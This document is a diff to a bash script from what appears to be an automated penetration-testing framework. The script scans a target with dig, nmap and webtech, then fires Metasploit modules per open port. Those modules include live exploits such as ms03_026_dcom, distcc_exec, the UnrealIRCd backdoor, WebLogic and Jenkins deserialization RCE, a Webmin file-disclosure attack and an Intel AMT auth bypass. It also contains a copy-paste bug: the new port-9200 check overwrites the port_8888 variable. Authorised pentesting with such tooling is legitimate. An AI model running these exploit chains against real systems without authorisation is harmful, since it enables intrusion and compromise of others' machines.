@@ -50,6 +50,7 @@ echo -e "$OKRED GATHERING DNS INFO $RESET"
 echo -e "${OKGREEN}====================================================================================${RESET}"
 dig all +short $TARGET > $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
 dig all +short -x $TARGET >> $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
+dig A $TARGET 2> /dev/null >> $LOOT_DIR/ips/ips-all-unsorted.txt 2> /dev/null
 dnsenum $TARGET 2> /dev/null
 mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
 
@@ -135,6 +136,7 @@ port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8888=`grep 'portid="9200"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_16992=`grep 'portid="16992"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_27017=`grep 'portid="27017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -276,9 +278,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING SMTP USER ENUM $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port25.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port25.raw > $LOOT_DIR/output/msf-$TARGET-port25.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port25.raw 2> /dev/null
+    msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw > $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw 2> /dev/null
   fi
 fi
 
@@ -382,6 +384,12 @@ else
   wget -qO- -T 1 --connect-timeout=5 --read-timeout=5 --tries=1 http://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-http-$TARGET.txt 2> /dev/null
   curl --connect-timeout 5 -I -s -R http://$TARGET | tee $LOOT_DIR/web/headers-http-$TARGET.txt 2> /dev/null
   curl --connect-timeout 5 -I -s -R -L http://$TARGET | tee $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null
+  if [ "$WEBTECH" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING WEB FINGERPRINT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    webtech -u http://$TARGET | grep \- | cut -d- -f2- | tee $LOOT_DIR/web/webtech-$TARGET-http.txt
+  fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED DISPLAYING META GENERATOR TAGS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -431,9 +439,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS \"$TARGET\"; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port111.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port111.raw > $LOOT_DIR/output/msf-$TARGET-port111.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port111.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS \"$TARGET\"; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw > $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw 2> /dev/null
   fi
   if [ "$SHOW_MOUNT" = "1" ]; then
     echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -479,9 +487,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port135.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port135.raw > $LOOT_DIR/output/msf-$TARGET-port135.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port135.raw 2> /dev/null
+    msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw > $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw 2> /dev/null
   fi
 fi
 
@@ -506,9 +514,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port137.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port137.raw > $LOOT_DIR/output/msf-$TARGET-port137.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port137.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-nbname.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-nbname.raw > $LOOT_DIR/output/msf-$TARGET-nbname.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-nbname.raw 2> /dev/null
   fi
 fi
 
@@ -557,9 +565,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port161.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port161.raw > $LOOT_DIR/output/msf-$TARGET-port161.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port161.raw 2> /dev/null
+    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw > $LOOT_DIR/output/msf-$TARGET-snmp_enum.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw 2> /dev/null
   fi
 fi
 
@@ -578,9 +586,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port162.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port162.raw > $LOOT_DIR/output/msf-$TARGET-port162.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port162.raw 2> /dev/null
+    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw > $LOOT_DIR/output/msf-$TARGET-snmp_enum.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw 2> /dev/null
   fi
 fi
 
@@ -632,6 +640,12 @@ else
   wget -qO- -T 1 --connect-timeout=5 --read-timeout=5 --tries=1 https://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-https-$TARGET.txt 2> /dev/null
   curl --connect-timeout 5 -I -s -R https://$TARGET | tee $LOOT_DIR/web/headers-https-$TARGET.txt 2> /dev/null
   curl --connect-timeout 5 -I -s -R -L https://$TARGET | tee $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null
+  if [ "$WEBTECH" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING WEB FINGERPRINT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    webtech -u https://$TARGET | grep \- | cut -d- -f2- | tee $LOOT_DIR/web/webtech-$TARGET-https.txt
+  fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED DISPLAYING META GENERATOR TAGS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -741,44 +755,6 @@ else
   fi
 fi
 
-if [ -z "$port_623" ];
-then
-  echo -e "$OKRED + -- --=[Port 623 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 623 opened... running tests...$RESET"
-  if [ "$AMAP" = "1" ]; then
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING AMAP $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    amap $TARGET 623 -A
-  fi
-  if [ "$NMAP_SCRIPTS" = "1" ]; then
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port623.txt
-  fi
-fi
-
-if [ -z "$port_624" ];
-then
-  echo -e "$OKRED + -- --=[Port 624 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 624 opened... running tests...$RESET"
-  if [ "$AMAP" = "1" ]; then
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING AMAP $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    amap $TARGET 624 -A
-  fi
-  if [ "$NMAP_SCRIPTS" = "1" ]; then
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port624.txt
-  fi
-fi
-
 if [ -z "$port_1099" ];
 then
   echo -e "$OKRED + -- --=[Port 1099 closed... skipping.$RESET"
@@ -800,8 +776,12 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run;"
-    msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;"
+    msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.txt
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw > $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw 2> /dev/null
+    msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.txt
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.raw 2> /dev/null
   fi
 fi
 
@@ -864,9 +844,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3306.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3306.raw > $LOOT_DIR/output/msf-$TARGET-port3306.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port3306.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw > $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw 2> /dev/null
   fi
 fi
 
@@ -911,7 +891,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$TARGET\"; run; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3389.txt
+    msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$TARGET\"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.txt
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.raw > $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.raw 2> /dev/null
   fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED RUNNING RDESKTOP CONNECTION $RESET"
@@ -934,9 +916,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port3632.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3632.raw > $LOOT_DIR/output/msf-$TARGET-port3632.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port3632.raw 2> /dev/null
+    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw > $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port3632-distcc_exec.raw 2> /dev/null
   fi
 fi
 
@@ -955,9 +937,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5432.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5432.raw > $LOOT_DIR/output/msf-$TARGET-port5432.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port5432.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw > $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port5432-postgres_login.raw 2> /dev/null
   fi
 fi
 
@@ -1001,9 +983,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5900.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5900.raw > $LOOT_DIR/output/msf-$TARGET-port5900.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port5900.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw > $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw 2> /dev/null
   fi
 fi
 
@@ -1022,9 +1004,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port5984.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5984.raw > $LOOT_DIR/output/msf-$TARGET-port5984.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port5984.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw > $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw 2> /dev/null
   fi
 fi
 
@@ -1043,9 +1025,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;" | tee $LOOT_DIR/output/msf-$TARGET-port6000.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6000.raw > $LOOT_DIR/output/msf-$TARGET-port6000.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port6000.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;" | tee $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw > $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw 2> /dev/null
   fi
 fi
 
@@ -1064,9 +1046,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port6667.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6667.raw > $LOOT_DIR/output/msf-$TARGET-port6667.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port6667.raw 2> /dev/null
+    msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw 2> /dev/null
   fi
 fi
 
@@ -1085,8 +1067,12 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; run; exit;"
-    msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; run; exit;"
+    msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw > $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw 2> /dev/null
+    msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw 2> /dev/null
   fi
 fi
 
@@ -1099,9 +1085,9 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port10000.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port10000.raw > $LOOT_DIR/output/msf-$TARGET-port10000.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port10000.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw > $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw 2> /dev/null
   fi
 fi
 
@@ -1110,19 +1096,13 @@ then
   echo -e "$OKRED + -- --=[Port 16992 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
-  if [ "$NMAP_SCRIPTS" = "1" ]; then
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port16992.txt
-  fi
   if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING INTEL AMT AUTH BYPASS EXPLOIT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port16992.raw
-    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port16992.raw > $LOOT_DIR/output/msf-$TARGET-port16992.txt 2> /dev/null
-    rm -f $LOOT_DIR/output/msf-$TARGET-port16992.raw 2> /dev/null
+    msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw 2> /dev/null
   fi
 fi
 
@@ -1200,6 +1180,7 @@ source modes/fullportscan.sh
 source modes/bruteforce.sh
 
 rm -f $LOOT_DIR/.fuse_* 2> /dev/null
